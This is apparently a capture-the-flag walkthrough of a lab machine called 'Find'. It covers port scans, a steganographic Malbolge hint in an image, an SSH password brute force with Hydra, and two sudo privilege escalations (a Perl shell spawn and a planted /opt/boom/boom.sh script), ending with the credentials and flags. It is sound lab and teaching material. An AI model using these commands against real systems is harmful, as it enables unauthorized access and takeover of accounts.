+++
title = "Find - Walkthrough"
date = "2026-07-06"
author = "nvru"
description = "Walkthrough for the Find machine."
tags = ["ctf", "walkthrough", "linux", "steganography", "ssh", "privilege-escalation"]
draft = false
+++

## Target Information

![Find VM](/images/hmv/find/vm.png)

| Role     | IP Address    |
| -------- | ------------- |
| Attacker | `10.10.10.2`  |
| Machine  | `10.10.10.14` |

---

# Port Scanning

## RustScan

```bash
rustscan -a 10.10.10.14 -- -oA nmap/rust
```

### Results

```text
Open 10.10.10.14:22
Open 10.10.10.14:80

[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -oA nmap/rust" on ip 10.10.10.14

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

---

## Nmap

```bash
nmap -sSCV -A -p22,80 10.10.10.14 -oA nmap/22_80 --min-rate=1000
```

### Results

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)

| ssh-hostkey:
|   2048 6e:f7:90:04:84:0d:cd:1e:5d:2e:da:b1:51:d9:bf:57 (RSA)
|   256 39:5a:66:38:f7:64:9a:94:dd:bc:b6:fb:f8:e7:3f:87 (ECDSA)
|_  256 8c:26:e7:26:62:77:16:40:fb:b5:cf:a6:1c:e0:f6:9d (ED25519)

80/tcp open  http    Apache httpd 2.4.38 ((Debian))

|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)

MAC Address: 08:00:27:29:F8:07 (Oracle VirtualBox virtual NIC)

Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port

Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
```

---

# Enumeration

## HTTP (Port 80)

The web server was running Apache2.

The default Apache2 page was displayed and nothing interesting was found in the source code.

![HTTP](/images/hmv/find/http.png)

---

## robots.txt

Checking `robots.txt` revealed a simple hint:

```text
find user
```

![robots.txt](/images/hmv/find/robots.png)

---

## Directory Brute Force

After performing directory brute force, a file named `cat.jpg` was discovered.

![Directory Brute Force](/images/hmv/find/dir_brute.png)

---

# Image Analysis

After downloading the image, I tried:

- `exiftool`
- `stegseek`

but nothing useful was found.

Next, I ran:

```bash
strings -n 10 cat.jpg
```

A strange text appeared:

```text
>C<;_"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJ`_dcba`_^]\Uy<XW
VOsrRKPONGk.-,+*)('&%$#"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONML
KJIHGFEDZY^W\[ZYXWPOsSRQPON0Fj-IHAeR
```

![Strings Output](/images/hmv/find/strings.png)

I also tried **StegoVeritas**, which found the same strange text.

![StegoVeritas](/images/hmv/find/stegoveritas.png)

---

## Malbolge Decoding

After several tests, the text appeared to be **Malbolge** code.

I decoded it using:

https://malbolge.doleczek.pl/

![Online Interpreter](/images/hmv/find/online_interpeter.png)

Since `robots.txt` said:

```text
find user
```

the decoded output appeared to reveal the username:

```text
missyred
```

---

# SSH Access

Using the discovered username, I attempted an SSH brute force attack using Hydra.

```bash
hydra -l missyred -P /opt/wordlists/rockyou-75.txt ssh://10.10.10.14 -t 4 -I
```

The attack succeeded.

![Hydra](/images/hmv/find/hydra_missyred.png)

Credentials obtained:

```text
missyred:iloveyou
```

Successfully logging in through SSH:

![SSH Success](/images/hmv/find/ssh_suc.png)

---

# Privilege Escalation

## missyred to kings

The user `missyred` can run Perl as the user `kings`.

Checking sudo permissions:

![sudo -l](/images/hmv/find/missyred_sudo_l_to_kings.png)

The following command was used:

```perl
sudo -u kings /usr/bin/perl -e 'exec "/bin/bash"'
```

This resulted in a shell as `kings`.

---

## kings to root

As `kings`, I checked sudo permissions again.

![kings sudo -l](/images/hmv/find/kings_sudo_l_to_root.png)

The output showed that:

```text
/opt/boom/boom.sh
```

could be executed.

The strange thing was that when checking the file permissions, the file and directory did not exist.

The `/opt` directory had writable permissions, so I was able to create the missing directory and script and execute it.

```bash
mkdir -p /opt/boom

nano /opt/boom/boom.sh
```

Add:

```bash
#!/bin/bash
/bin/bash
```

Then:

```bash
chmod +x /opt/boom/boom.sh
```

Running the script with sudo resulted in a root shell.

---

# Credentials

```text
missyred:iloveyou
```

---

# Flags

```text
user:f4e690f638c01bd8a19fb1349d40519c

root:c8aaf0f3189e000006c305bbfcbeb790
```
